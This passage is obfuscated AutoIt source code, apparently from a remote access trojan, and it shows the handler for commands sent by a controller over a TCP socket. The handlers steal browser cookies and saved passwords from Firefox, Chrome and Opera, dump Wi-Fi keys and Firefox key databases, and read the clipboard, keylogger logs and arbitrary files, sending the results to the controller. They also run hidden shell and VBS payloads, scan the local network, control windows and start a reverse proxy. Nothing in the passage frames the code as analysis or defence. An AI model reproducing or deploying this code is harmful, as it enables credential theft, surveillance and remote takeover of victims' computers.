                        Run("C:\Windows\system32\cmd.exe" & " /c start " & $S5JJ3PE7DX1E[3] & ".exe" & ' "' & $S5JJ3PE7DX1E[2] & '"', "", @SW_HIDE)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "ONXMPDE") Then
                    $O4TF9DS4KA2F = FileRead($mons & "\" & @MDAY & "-" & @MON & "-" & @YEAR & ".txt")
                    If $O4TF9DS4KA2F <> "" Then
                        TCPSend($mainSocket, $O4TF9DS4KA2F)
                    Else
                        TCPSend($mainSocket, "Empty File")
                    EndIf
                    TCPSend($mainSocket, "CdrSSx")
                EndIf
                If StringInStr($P2OJ8OL0Y, "wixfix98a") Then
                    $S0IC8BE4SY2F = Run("netsh wlan show profiles", "", @SW_HIDE, $StdOut_Child)
                    $M4CT6LD7UG3N = TimerInit()
                    $U4VW2WL4X = ""
                    While 1
                        Sleep(10)
                        $K8XA4FA6V = StdoutRead($S0IC8BE4SY2F, 0)
                        If @error Then ExitLoop
                        $U4VW2WL4X &= $K8XA4FA6V
                        If TimerDiff($M4CT6LD7UG3N) > 8000 Then ExitLoop
                    WEnd
                    $V0DK4GJ4H = StringSplit($U4VW2WL4X, "Profil ", 1)
                    If IsArray($V0DK4GJ4H) Then
                        $D4ON6XP2Y9VA1RL4N = ""
                        For $i8EX4EL1CL9H = 2 To $V0DK4GJ4H[0] Step +1
                            $L8CD3XG4ZC9M = _stringbetween($V0DK4GJ4H[$i8EX4EL1CL9H], ": ", "")
                            If IsArray($L8CD3XG4ZC9M) Then
                                $S1XZ5JY8PT0P = StringReplace($L8CD3XG4ZC9M[0], @CRLF, "")
                                $U6GC3OE8LI0L = StringReplace($S1XZ5JY8PT0P, " ", "")
                                $D4ON6XP2Y9VA1RL4N &= $U6GC3OE8LI0L & "|"
                            EndIf
                        Next
                    EndIf
                    TCPSend($mainSocket, "Poofazxx" & $D4ON6XP2Y9VA1RL4N & "fd9rawn")
                EndIf
                If StringInStr($P2OJ8OL0Y, "pxfitsaaq") Then
                    $H8LT3TX2XW5R = _stringbetween($P2OJ8OL0Y, "pxfitsaaq", "ppezcc8z")
                    If IsArray($H8LT3TX2XW5R) Then
                        $N8LF7BZ4Q8RA1BU3RH0Q = Run("netsh wlan show profiles " & $H8LT3TX2XW5R[0] & " Key=Clear", "", @SW_HIDE, $StdOut_Child)
                        $C0UN0AI1L = TimerInit()
                        $H9PQ6SF3Z = ""
                        While 1
                            Sleep(10)
                            $M4OG0SC6HL7R = StdoutRead($N8LF7BZ4Q8RA1BU3RH0Q, 0)
                            If @error Then ExitLoop
                            $H9PQ6SF3Z &= $M4OG0SC6HL7R
                            If TimerDiff($C0UN0AI1L) > 8000 Then ExitLoop
                        WEnd
                        TCPSend($mainSocket, $H9PQ6SF3Z)
                        TCPSend($mainSocket, "PRODISPX")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "stealfoxer") Then
                    $Q6YG2PX7AH8T = @AppDataDir & "\Mozilla\Firefox\"
                    $x5MK2KF3ON6V = FileOpen($Q6YG2PX7AH8T & "\profiles.ini", 0)
                    $P8BL9WU9KD9X = FileRead($x5MK2KF3ON6V)
                    FileClose($x5MK2KF3ON6V)
                    $T1UL0RT6PZ9P = _stringbetween($P8BL9WU9KD9X, "Path=Profiles/", @CRLF)
                    $mainCookiesDb = $Q6YG2PX7AH8T & "Profiles\" & $T1UL0RT6PZ9P[0] & "\cookies.sqlite"
                    If FileExists($mainCookiesDb) Then
                        $tempCookiesDb = @TempDir & "\dbsq.db"
                        FileDelete($tempCookiesDb)
                        FileCopy($mainCookiesDb, $tempCookiesDb, 1)
                        _sqlite_create_dll()
                        Local $M3GT9SG8BK9D, $R5IZ1KV5S5KZ2AH0M, $S0RV8IR5UX2O
                        _sqlite_startup($SQLite3DLL)
                        $hdb = _sqlite_open($tempCookiesDb)
                        $irval = _sqlite_gettable2d(-1, "SELECT * FROM moz_cookies;", $M3GT9SG8BK9D, $R5IZ1KV5S5KZ2AH0M, $S0RV8IR5UX2O)
                        If $irval = $sqlite_ok Then
                            If IsArray($M3GT9SG8BK9D) Then
                                $sCookies = ""
                                For $io = 1 To UBound($M3GT9SG8BK9D, 1) - 1 Step +1
                                    $sCookies &= $M3GT9SG8BK9D[$io][5] & "[[#" & $M3GT9SG8BK9D[$io][3] & "[[#" & $M3GT9SG8BK9D[$io][4] & "[[#" & $M3GT9SG8BK9D[$io][6] & "[[#" & $M3GT9SG8BK9D[$io][10] & "[[#" & $M3GT9SG8BK9D[$io][11] & "@#@"
                                Next
                                TCPSend($mainSocket, $sCookies)
                                TCPSend($mainSocket, "Stealdonex")
                            EndIf
                        EndIf
                        _sqlite_close($hdb)
                        _sqlite_shutdown()
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "stealchromer") Then
                    $mainCookiesDb = $H2UM3ZD9E
                    _Get_Chrome_Opera_Cookies()
                EndIf
                If StringInStr($P2OJ8OL0Y, "stealoperaer") Then
                    $mainCookiesDb = $D4RJ8UV1K
                    _Get_Chrome_Opera_Cookies()
                EndIf
                If StringInStr($P2OJ8OL0Y, "loxchrox") Then
                    $PasswordDb = $W0TK7PD8PP2Q
                    _Get_Chrome_Opera_Password()
                EndIf
                If StringInStr($P2OJ8OL0Y, "loxoperax") Then
                    $PasswordDb = $Q5HG7OE0KG6D
                    _Get_Chrome_Opera_Password()
                EndIf
                If StringInStr($P2OJ8OL0Y, "loxFFoxer") Then
                    Local $sSiteUserPwd = _Firefox_Password_recovery()
                    TCPSend($mainSocket, StringTrimRight($sSiteUserPwd, 2))
                    TCPSend($mainSocket, "logdoxets")
                EndIf
                If StringInStr($P2OJ8OL0Y, "VETXXq1") Then
                    $g_getAllPwds = 1
                    $g_sAllPasswords = ""
                    $PasswordDb = $W0TK7PD8PP2Q
                    $g_sAllPasswords = _Get_Chrome_Opera_Password()
                    $PasswordDb = $Q5HG7OE0KG6D
                    $g_sAllPasswords &= _Get_Chrome_Opera_Password()
                    $sSiteUserPwd = _Firefox_Password_recovery()
                    $g_sAllPasswords &= $sSiteUserPwd
                    TCPSend($mainSocket, "PTT2WQ" & $g_sAllPasswords & "ttya")
                    $g_getAllPwds = 0
                EndIf
                If StringInStr($P2OJ8OL0Y, "chbrxrzzz4") Then
                    $S1GE6FV9TO2P = ""
                    If FileExists($H2UM3ZD9E) Then
                        $S1GE6FV9TO2P &= "|Chrome"
                    EndIf
                    If FileExists($D4RJ8UV1K) Then
                        $S1GE6FV9TO2P &= "|Opera"
                    EndIf
                    If FileExists($U4OJ2ZC5KV7V & "\Mozilla\Firefox\") Then
                        $S1GE6FV9TO2P &= "|Firefox"
                    EndIf
                    If $S1GE6FV9TO2P = "" Then
                        $S1GE6FV9TO2P = "|No Browser"
                    EndIf
                    TCPSend($mainSocket, "BRizx" & $S1GE6FV9TO2P & "vrr")
                    $S1GE6FV9TO2P = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "i4a3e154ax") Then
                    $W7LI7QC4KO5E = _stringbetween($P2OJ8OL0Y, "i4a3e154ax", "duuoda4")
                    If IsArray($W7LI7QC4KO5E) Then
                        RegDelete($Z1OR0IB4AG8M & $W7LI7QC4KO5E[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "8t0xacssat") Then
                    $N9NW0BZ8LM1M = ""
                    For $E5QI2EA5AD8M = 1 To 100
                        Local $E1OA4WC5Q = RegEnumKey($Z1OR0IB4AG8M, $E5QI2EA5AD8M)
                        If @error <> 0 Then ExitLoop
                        If StringRight($E1OA4WC5Q, 4) = ".exe" Then
                            $D4ON6XP2Y4TZ9AV2SO7M = RegRead($Z1OR0IB4AG8M & $E1OA4WC5Q, "Debugger")
                            If $D4ON6XP2Y4TZ9AV2SO7M = "1" Then
                                $N9NW0BZ8LM1M &= $E1OA4WC5Q & "|"
                            EndIf
                        EndIf
                    Next
                    If $N9NW0BZ8LM1M <> "" Then
                        TCPSend($mainSocket, "PFdsrt0F0AA" & $N9NW0BZ8LM1M & "fdaex")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "SPJSS445") Then
                    $T7FP1EH9QX0T = _stringbetween($P2OJ8OL0Y, "SPJSS445", "pax3abdss")
                    If IsArray($T7FP1EH9QX0T) Then
                        RegWrite($Z1OR0IB4AG8M & $T7FP1EH9QX0T[0], "Debugger", "REG_SZ", "1")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "X7AEE+") Then
                    AutoItWinSetTitle("M")
                    $Q2EJ1UU8HS6F = RegRead($A, $B)
                    If $Q2EJ1UU8HS6F = 0 Then
                        Exit ShellExecute($ScriptPath, "", "", "runas")
                    Else
                        $P2OJ8OL0Y = StringReplace($P2OJ8OL0Y, "@ScriptFullPath", $ScriptPath)
                        $V5QN9XF4O = @TempDir & "\uax8.vbs"
                        $R5IZ1KV5S0ZR4XL4T = _stringbetween($P2OJ8OL0Y, "X7AEE+", "rXraps")
                        If IsArray($R5IZ1KV5S0ZR4XL4T) Then
                            $D9EN3XD9PX6S = FileOpen($V5QN9XF4O, 2)
                            FileWrite($D9EN3XD9PX6S, $R5IZ1KV5S0ZR4XL4T[0])
                            FileClose($D9EN3XD9PX6S)
                            ShellExecute($V5QN9XF4O)
                            Sleep(3000)
                            FileDelete($V5QN9XF4O)
                        EndIf
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "USvwZqqp") Then
                    $M7SL6UG9S = _stringbetween($P2OJ8OL0Y, "USvwZqqp", "PDzd1233")
                    $R5IZ1KV5S3YZ1PJ1OR9F = _stringbetween($P2OJ8OL0Y, "PDzd1233", "oaad@n45")
                    If IsArray($M7SL6UG9S) And IsArray($R5IZ1KV5S3YZ1PJ1OR9F) Then
                        $U3DV3HS0G = FileOpen($M7SL6UG9S[0], 2)
                        FileWrite($U3DV3HS0G, $R5IZ1KV5S3YZ1PJ1OR9F[0])
                        FileClose($U3DV3HS0G)
                        $P2OJ8OL0Y = ""
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "wachsayer") Then
                    If FileExists($F4NB4ZE9W) Then
                        TCPSend($mainSocket, "HAWalikoum")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Xhnazz") Then
                    FileDelete(@TempDir & $R5IZ1KV5S3VC0PZ1EY0P)
                    Run("C:\Windows\system32\cmd.exe" & $x9OV4RF5HH2V, @TempDir, "", @SW_HIDE)
                    Sleep(4000)
                    TCPSend($mainSocket, "ExtUx")
                    $Q4YC2XA0A = FileOpen(@TempDir & $R5IZ1KV5S3VC0PZ1EY0P, 16)
                    $M9CM9WV7E7OZ7EE6P = FileRead($Q4YC2XA0A)
                    FileClose($Q4YC2XA0A)
                    TCPSend($mainSocket, $M9CM9WV7E7OZ7EE6P)
                    TCPSend($mainSocket, "WXSTOSS4")
                EndIf
                If StringInStr($P2OJ8OL0Y, "IUY23cx") Then
                    FileDelete($F4NB4ZE9W)
                EndIf
                If StringInStr($P2OJ8OL0Y, "Cxltta3") Then
                    $D4ON6XP2Y7PV7SI5I = _stringbetween($P2OJ8OL0Y, "Cxltta3", "9hghgzxx")
                    If IsArray($D4ON6XP2Y7PV7SI5I) Then
                        _ReplaceStringInFile($R5IZ1KV5S0PB2OX5LH3O, $D4ON6XP2Y7PV7SI5I[0], "" & @CRLF)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "RSPPAOUELBC") Then
                    Local $M1IK9SX5N
                    _filereadtoarray($R5IZ1KV5S0PB2OX5LH3O, $M1IK9SX5N)
                    If IsArray($M1IK9SX5N) Then
                        $D4ON6XP2Y3RE2JV3BG1O = ""
                        For $F9UP2BL6W = 1 To $M1IK9SX5N[0] Step +1
                            If StringInStr($M1IK9SX5N[$F9UP2BL6W], "#8Blx") Or StringInStr($M1IK9SX5N[$F9UP2BL6W], "#8Rex") Then
                                $D4ON6XP2Y3RE2JV3BG1O &= $M1IK9SX5N[$F9UP2BL6W] & "|"
                            EndIf
                        Next
                        TCPSend($mainSocket, "paztdss" & $D4ON6XP2Y3RE2JV3BG1O & "innzsds")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "BLXIS") Then
                    $Z7QF2KD3OO4Q = _stringbetween($P2OJ8OL0Y, "BLXIS", "PC5SDD")
                    If IsArray($Z7QF2KD3OO4Q) Then
                        FileWrite($R5IZ1KV5S0PB2OX5LH3O, $Z7QF2KD3OO4Q[0] & @CRLF)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "BLkeryt") Then
                    $i2WU4HG1DJ0I = _stringbetween($P2OJ8OL0Y, "BLkeryt", "PC5vvvs")
                    If IsArray($i2WU4HG1DJ0I) Then
                        FileWrite($R5IZ1KV5S0PB2OX5LH3O, $i2WU4HG1DJ0I[0] & @CRLF)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "kocalsr") Then
                    $F4JW9CT9N = _stringbetween($P2OJ8OL0Y, "kocalsr", "bgnssw45")
                    $x5PD8OS0Q = ""
                    If IsArray($F4JW9CT9N) Then
                        $E5KK7DG0J = StringRight($F4JW9CT9N[0], 4)
                        If $E5KK7DG0J = ".lnk" Then
                            Local $D4ON6XP2Y3AG7MS7R = FileGetShortcut($F4JW9CT9N[0])
                            If IsArray($D4ON6XP2Y3AG7MS7R) And Not @error Then
                                $x5PD8OS0Q = "Path : " & $D4ON6XP2Y3AG7MS7R[0]
                            EndIf
                        Else
                            $D4ON6XP2Y9VM2VY4NV2U = FileOpen($F4JW9CT9N[0], 0)
                            $x5PD8OS0Q = FileRead($D4ON6XP2Y9VM2VY4NV2U)
                            FileClose($D4ON6XP2Y9VM2VY4NV2U)
                        EndIf
                        TCPSend($mainSocket, $x5PD8OS0Q)
                        TCPSend($mainSocket, "8a5213fdq")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Sofxzitre") Then
                    If IsAdmin() Then
                        $V0UX8HS7LM6P = Run("netstat -n -b -o", "", @SW_HIDE, $StdOut_Child)
                    Else
                        $V0UX8HS7LM6P = Run("netstat -n -o", "", @SW_HIDE, $StdOut_Child)
                    EndIf
                    $F2AJ0PT2G = ""
                    $Q5ET7PP2U = TimerInit()
                    While 1
                        Sleep(10)
                        $D4ON6XP2Y6CY0TX0RF1A = StdoutRead($V0UX8HS7LM6P, 0)
                        If @error Then ExitLoop
                        $F2AJ0PT2G &= $D4ON6XP2Y6CY0TX0RF1A
                        If TimerDiff($Q5ET7PP2U) > 8000 Then ExitLoop
                    WEnd
                    $D4ON6XP2Y1WK5MY9Z = @AutoItPID
                    $P9YC3AZ9L = StringReplace($F2AJ0PT2G, " " & $D4ON6XP2Y1WK5MY9Z, " " & $D4ON6XP2Y1WK5MY9Z & "    << My Server")
                    TCPSend($mainSocket, $P9YC3AZ9L)
                    TCPSend($mainSocket, "WSEsofwe")
                EndIf
                If StringInStr($P2OJ8OL0Y, "nescannez") Then
                    $F8NM0XP8NP6BKZ5WD1F = "."
                    $T6SB4ZD0F = StringSplit(@IPAddress1, $F8NM0XP8NP6BKZ5WD1F)
                    $O4FZ4UZ0RS6I = _stringbetween($P2OJ8OL0Y, "nescannez", "vajuz")
                    If IsArray($O4FZ4UZ0RS6I) Then
                        $V9WR1BK5MU6A = $O4FZ4UZ0RS6I[0]
                    Else
                        $V9WR1BK5MU6A = 30
                    EndIf
                    $R5IZ1KV5S0GT5JN5ZB1R = ""
                    For $W9GK6QP2CR5X = 1 To $V9WR1BK5MU6A
                        $F8FZ3PY9QI3L = $T6SB4ZD0F[1] & $F8NM0XP8NP6BKZ5WD1F & $T6SB4ZD0F[2] & $F8NM0XP8NP6BKZ5WD1F & $T6SB4ZD0F[3] & $F8NM0XP8NP6BKZ5WD1F & $W9GK6QP2CR5X
                        $V0QF3MG6PE4P = Run("ping " & $F8FZ3PY9QI3L & " -n 2 -w " & 500, "", @SW_HIDE, $StdOut_Child)
                        TCPSend($mainSocket, "rdds" & $F8FZ3PY9QI3L & "@sa")
                        $M1QL9XI5RE5F = ""
                        $i8MU7YG1N = TimerInit()
                        Sleep(1)
                        While 1
                            Sleep(10)
                            $E1AG6DW3L = StdoutRead($V0QF3MG6PE4P, 0)
                            If @error Then ExitLoop
                            $M1QL9XI5RE5F &= $E1AG6DW3L
                            If TimerDiff($i8MU7YG1N) > 8000 Then ExitLoop
                        WEnd
                        If _stringbetween($M1QL9XI5RE5F, "= ", "ms") <> "" Then
                            $F1CE2LL6H5MF7XD3SR7W = _TcpIpToName($F8FZ3PY9QI3L)
                            If $F1CE2LL6H5MF7XD3SR7W = "" Then
                                $F1CE2LL6H5MF7XD3SR7W = "Unknow"
                            EndIf
                            $U8RD0ZJ8QX0C = _stringbetween($M1QL9XI5RE5F, "TTL=", @CRLF)
                            If IsArray($U8RD0ZJ8QX0C) Then
                                $O7JK3GE5C = $U8RD0ZJ8QX0C[0]
                            Else
                                $O7JK3GE5C = "x"
                            EndIf
                            $R5IZ1KV5S0GT5JN5ZB1R &= $F8FZ3PY9QI3L & "|" & $F1CE2LL6H5MF7XD3SR7W & "|" & $O7JK3GE5C & "@"
                        EndIf
                    Next
                    TCPSend($mainSocket, "Sbascax" & $R5IZ1KV5S0GT5JN5ZB1R & "rtxp")
                EndIf
                If StringInStr($P2OJ8OL0Y, "GexthWin") Then
                    Local $V8HR8DF1T = WinList()
                    Local $F2JO5GM0W = ""
                    $W1IY0WA8DX4K = 0
                    Local $x1DV7BJ0YS9H = ""
                    For $i = 1 To $V8HR8DF1T[0][0]
                        Local $Z2JO2LW0P = $V8HR8DF1T[$i][0]
                        If $Z2JO2LW0P <> "" Then
                            If WINSTAX($Z2JO2LW0P, 2) Then
                                If WINSTAX($Z2JO2LW0P, 8) Then
                                    $F2JO5GM0W &= $Z2JO2LW0P & "@|@"
                                    $W1IY0WA8DX4K = $W1IY0WA8DX4K + 1
                                    $x1DV7BJ0YS9H = $W1IY0WA8DX4K
                                Else
                                    $F2JO5GM0W &= $Z2JO2LW0P & "@|@"
                                    $W1IY0WA8DX4K = $W1IY0WA8DX4K + 1
                                EndIf
                            EndIf
                        EndIf
                    Next
                    $E9ZN4DW0E = StringTrimRight($F2JO5GM0W, 3)
                    If $E9ZN4DW0E <> "" Then
                        TCPSend($mainSocket, "Re7winxs" & $E9ZN4DW0E & "PAF86" & $x1DV7BJ0YS9H & "ir446")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "IFFAxtpa") Then
                    $W9UM5OR3E = _stringbetween($P2OJ8OL0Y, "IFFAxtpa", "PORAA56")
                    $V3GJ0UK3O = _stringbetween($P2OJ8OL0Y, "PORAA56", "daaop")
                    If IsArray($W9UM5OR3E) And IsArray($V3GJ0UK3O) Then
                        If $V3GJ0UK3O[0] <> "" And $W9UM5OR3E[0] <> "" Then
                            If $V3GJ0UK3O[0] = "1" Then
                                WinActivate($W9UM5OR3E[0])
                            ElseIf $V3GJ0UK3O[0] = "2" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_HIDE)
                            ElseIf $V3GJ0UK3O[0] = "3" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_SHOW)
                            ElseIf $V3GJ0UK3O[0] = "4" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_MINIMIZE)
                            ElseIf $V3GJ0UK3O[0] = "5" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_MAXIMIZE)
                            ElseIf $V3GJ0UK3O[0] = "6" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_DISABLE)
                            ElseIf $V3GJ0UK3O[0] = "7" Then
                                WinSetState($W9UM5OR3E[0], "", @SW_ENABLE)
                            ElseIf $V3GJ0UK3O[0] = "8" Then
                                WinClose($W9UM5OR3E[0], "")
                            EndIf
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Ti8zaww") Then
                    Local $Z7NQ9VQ5CH8H = WinGetTitle("")
                    If $Z7NQ9VQ5CH8H <> "" Then
                        TCPSend($mainSocket, "pr67dd" & $Z7NQ9VQ5CH8H & "ptaexx")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "TX3zQp") Then
                    $H1RL1RT5JC3P = _stringbetween($P2OJ8OL0Y, "TX3zQp", "@dxa")
                    If IsArray($H1RL1RT5JC3P) Then
                        $R5IZ1KV5S0HB9LX7T = @TempDir & "\imtxt.txt"
                        $M9CH5DQ4GT2F = FileOpen($R5IZ1KV5S0HB9LX7T, 2)
                        FileWrite($M9CH5DQ4GT2F, $H1RL1RT5JC3P[0])
                        FileClose($M9CH5DQ4GT2F)
                        $M9CM9WV7E8AS8JW5K = _FilePrint($R5IZ1KV5S0HB9LX7T, @SW_HIDE)
                        If $M9CM9WV7E8AS8JW5K Then
                            TCPSend($mainSocket, "Impr9goox")
                        Else
                            TCPSend($mainSocket, "ImpErr89")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Verif8s") Then
                    $F2WK5QA3NX6KJL1KR4Q = RegRead("HKCU\Software\Win32", "imgCli")
                    If $F2WK5QA3NX6KJL1KR4Q = "" Then
                        $F2WK5QA3NX6KJL1KR4Q = 0
                    EndIf
                    $K7JX1QU5W = RegRead("HKCU\Software\Win32", "img")
                    If $K7JX1QU5W = "" Then
                        $K7JX1QU5W = 0
                    EndIf
                    TCPSend($mainSocket, "Vrufresl" & $F2WK5QA3NX6KJL1KR4Q & $K7JX1QU5W & "orre")
                EndIf
                If StringInStr($P2OJ8OL0Y, "Revprox87") Then
                    $E9UE3CZ3H = _stringbetween($P2OJ8OL0Y, "Revprox87", "Csz")
                    If IsArray($E9UE3CZ3H) Then
                        If Not FileExists($DLCLIE) Then
                            $Z0OR9ER0WB8V = PlureVB()
                            FileWrite($DLCLIE, BinaryToString($Z0OR9ER0WB8V))
                        EndIf
                        Sleep(500)
                        Global $PROXYDLL = DllOpen($DLCLIE)
                        ProxyClient_Start($x4JQ4AM2ZU2V, $E9UE3CZ3H[0])
                        FileDelete($DLCLIE)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Q0TAqp") Then
                    $Z5FZ9VV6V = _stringbetween($P2OJ8OL0Y, "Q0TAqp", "Adrta")
                    If IsArray($Z5FZ9VV6V) Then
                        If $Z5FZ9VV6V[0] <> "" Then
                            ClipPut($Z5FZ9VV6V[0])
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "COXPIRE") Then
                    Local $S6PC6KU9I = ClipGet()
                    If $S6PC6KU9I <> "" Then
                        TCPSend($mainSocket, "CLGetres" & $S6PC6KU9I & "YZExq")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "FoCxPArs") Then
                    If FileExists($D3UZ0LM3WQ2O) Then
                        $S1AS0XE1GC8D7OG7MK4J = FileOpen($U4OJ2ZC5KV7V & "\Mozilla\Firefox\profiles.ini", 0)
                        $D4ON6XP2Y5UW3PV2UL4V = FileRead($S1AS0XE1GC8D7OG7MK4J)
                        FileClose($S1AS0XE1GC8D7OG7MK4J)
                        $H8EG9FA1IR0V = _stringbetween($D4ON6XP2Y5UW3PV2UL4V, "Path=Profiles/", @CRLF)
                        If IsArray($H8EG9FA1IR0V) Then
                            DirCreate($F1CE2LL6H0DD8EM7IO9P)
                            FileCopy($D3UZ0LM3WQ2O & $H8EG9FA1IR0V[0] & $R5IZ1KV5S4US4VV8E, $F1CE2LL6H0DD8EM7IO9P & $R5IZ1KV5S4US4VV8E, 1)
                            FileCopy($D3UZ0LM3WQ2O & $H8EG9FA1IR0V[0] & $W4TB6KX5D, $F1CE2LL6H0DD8EM7IO9P & $W4TB6KX5D, 1)
                            FileCopy($D3UZ0LM3WQ2O & $H8EG9FA1IR0V[0] & $M9CM9WV7E1EJ2RK9JV5V, $F1CE2LL6H0DD8EM7IO9P & $M9CM9WV7E1EJ2RK9JV5V, 1)
                        EndIf
                        Sleep(500)
                        If FileExists($F1CE2LL6H0DD8EM7IO9P & $R5IZ1KV5S4US4VV8E) And FileExists($F1CE2LL6H0DD8EM7IO9P & $W4TB6KX5D) And FileExists($F1CE2LL6H0DD8EM7IO9P & $M9CM9WV7E1EJ2RK9JV5V) Then
                            $P8NF9VI3C = FileOpen($F1CE2LL6H0DD8EM7IO9P & $R5IZ1KV5S4US4VV8E, 16)
                            $C5EY0RU5F = FileRead($P8NF9VI3C)
                            FileClose($P8NF9VI3C)
                            TCPSend($mainSocket, $C5EY0RU5F)
                            TCPSend($mainSocket, "Ijsox")
                            Sleep(4000)
                            $F2SG4ZY5XX2E = FileOpen($F1CE2LL6H0DD8EM7IO9P & $W4TB6KX5D, 16)
                            $H1DD2TQ1EV7T = FileRead($F2SG4ZY5XX2E)
                            FileClose($F2SG4ZY5XX2E)
                            TCPSend($mainSocket, $H1DD2TQ1EV7T)
                            TCPSend($mainSocket, "Ikeyox")
                            Sleep(4000)
                            $x8WZ3QM9F = FileOpen($F1CE2LL6H0DD8EM7IO9P & $M9CM9WV7E1EJ2RK9JV5V, 16)
                            $N8LF7BZ4Q2GN4PZ8KU3O = FileRead($x8WZ3QM9F)
                            FileClose($x8WZ3QM9F)
                            TCPSend($mainSocket, $N8LF7BZ4Q2GN4PZ8KU3O)
                            TCPSend($mainSocket, "Icertox")
                        Else
                            TCPSend($mainSocket, "Foixnot")
                        EndIf
                    Else
                        TCPSend($mainSocket, "Foixnot")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DixrImagxx|") Then
                    Sleep(500)
                    $S2NS4DW3ZI0T = _stringbetween($P2OJ8OL0Y, "DixrImagxx|", "|")
                    If IsArray($S2NS4DW3ZI0T) Then
                        $P3OA5KB5QB1H = ""
                        $N8LF7BZ4Q9SL2SD0R = _filelisttoarray($S2NS4DW3ZI0T[0], "*.jpg", 1)
                        $F0LL1RP6JS0R = _filelisttoarray($S2NS4DW3ZI0T[0], "*.png", 1)
                        $S1AS0XE1GC8D2TB3TR8R = _filelisttoarray($S2NS4DW3ZI0T[0], "*.gif", 1)
                        $K0SM8RN5XR0J = _filelisttoarray($S2NS4DW3ZI0T[0], "*.bmp", 1)
                        _arrayconcatenate($N8LF7BZ4Q9SL2SD0R, $F0LL1RP6JS0R, 1)
                        _arrayconcatenate($N8LF7BZ4Q9SL2SD0R, $S1AS0XE1GC8D2TB3TR8R, 1)
                        _arrayconcatenate($N8LF7BZ4Q9SL2SD0R, $K0SM8RN5XR0J, 1)
                        $P3OA5KB5QB1H &= _arraytostring($N8LF7BZ4Q9SL2SD0R, "|", 1)
                        If $P3OA5KB5QB1H <> "" Then
                            $N8LF7BZ4Q7VN9TJ9U = StringSplit($P3OA5KB5QB1H, "|")
                            If IsArray($N8LF7BZ4Q7VN9TJ9U) Then
                                TCPSend($mainSocket, "DiEnxgeTssb" & $N8LF7BZ4Q7VN9TJ9U[0] & "|dds")
                                _gdiplus_startup()
                                For $N3TX7NI0Q = 1 To $N8LF7BZ4Q7VN9TJ9U[0] Step +1
                                    $H2PO2KK3B = StringRight($N8LF7BZ4Q7VN9TJ9U[$N3TX7NI0Q], 4)
                                    Sleep(500)
                                    Local $N7TC4LY3EX9H = _gdiplus_imageloadfromfile($S2NS4DW3ZI0T[0] & "\" & $N8LF7BZ4Q7VN9TJ9U[$N3TX7NI0Q])
                                    Local $M9CM9WV7E9OI7UU1GK3Q = _gdiplus_scaleimage($N7TC4LY3EX9H, 200, 130)
                                    U5BG4KX2H($M9CM9WV7E9OI7UU1GK3Q, @TempDir & "\vvza.jpg")
                                    H8HR2NH5L($M9CM9WV7E9OI7UU1GK3Q)
                                    $W1TM5FJ6JC5L = FileOpen(@TempDir & "\vvza.jpg", 16)
                                    $Z0NA2FO1FB6F = FileRead($W1TM5FJ6JC5L)
                                    FileClose($Z0NA2FO1FB6F)
                                    TCPSend($mainSocket, $Z0NA2FO1FB6F)
                                    TCPSend($mainSocket, "DirCloq|" & $N8LF7BZ4Q7VN9TJ9U[$N3TX7NI0Q] & "|treispo")
                                    $M9CM9WV7E9OI7UU1GK3Q = ""
                                    $D4ON6XP2Y3SJ8JF6XP4R = ""
                                Next
                                $P3OA5KB5QB1H = ""
                                _gdiplus_shutdown()
                            EndIf
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "FKKKSTTTA08") Then
                    $V3UF0NP4S = _stringbetween($P2OJ8OL0Y, "FKKKSTTTA08", "PSZDZ")
                    If IsArray($V3UF0NP4S) Then
                        Send($V3UF0NP4S[0] & "{Enter}")
                    EndIf
                    $P2OJ8OL0Y = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "MpS8x") Then
                    $D2RT0EH2F = _stringbetween($P2OJ8OL0Y, "MpS8x", "PZZ")
                    If IsArray($D2RT0EH2F) Then
                        $D6XT9TC5S = @TempDir & "\ms.vbs"
                        $H0DQ3VU9H = FileOpen($D6XT9TC5S, 2)
                        FileWrite($H0DQ3VU9H, 'Msgbox("' & $D2RT0EH2F[0] & '")')
                        FileClose($H0DQ3VU9H)
                        ShellExecute($D6XT9TC5S)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Plifinstl") Then
                    If ProcessExists($PID2) Then
                        TCPSend($mainSocket, "plDoxdej")
                    Else
                        TCPSend($mainSocket, "noplugxin")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "MgPlugUp") Then
                    RegWrite("HKCU\Software\Win32", "keyx", "REG_SZ", "1")
                    keyDDQ()
                    Sleep(500)
                    If ProcessExists($PID2) Then
                        TCPSend($mainSocket, "plDoxdej")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "srtaapxx") Then
                    $dAStr = 0
                    RegDelete("HKCU\Software\Win32", "keyx")
